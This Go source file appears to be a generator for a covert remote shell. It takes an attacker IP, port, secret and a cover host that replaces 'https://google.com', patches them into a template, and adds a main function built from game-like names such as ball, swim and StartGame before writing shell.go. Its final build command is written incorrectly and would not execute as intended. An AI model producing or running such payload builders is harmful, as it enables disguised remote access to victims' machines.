package main

import (
    "fmt"
    "io/ioutil"
    "log"
	"strings"
	"os"
	"os/exec"
)

func main() {
	args := os.Args
	ip := args[1]
	port := args[2]
	secret:= args[3]
	host := args[4]
    content, err := ioutil.ReadFile("funs.go")
	f, err := os.Create("./output/shell.go")
	defer f.Close()
     if err != nil {
          log.Fatal(err)
     }
	 add_main := "func main() {\nsize()\nball()\nswim()\nStartGame()\n}"
    edit_content := string(content)
	edit_content = strings.Replace(edit_content, "127.0.0.1",ip,-1)
	edit_content = strings.Replace(edit_content, ":443",":"+port,-1)
	edit_content = strings.Replace(edit_content, "change_this_please",secret,-1)
	edit_content = strings.Replace(edit_content, "//add_main_here",add_main,-1)
	edit_content = strings.Replace(edit_content, "https://google.com",host,-1)
	
	
	
	fmt.Fprintln(f,edit_content)
	exec.Command("cd output && go build shell.go")
}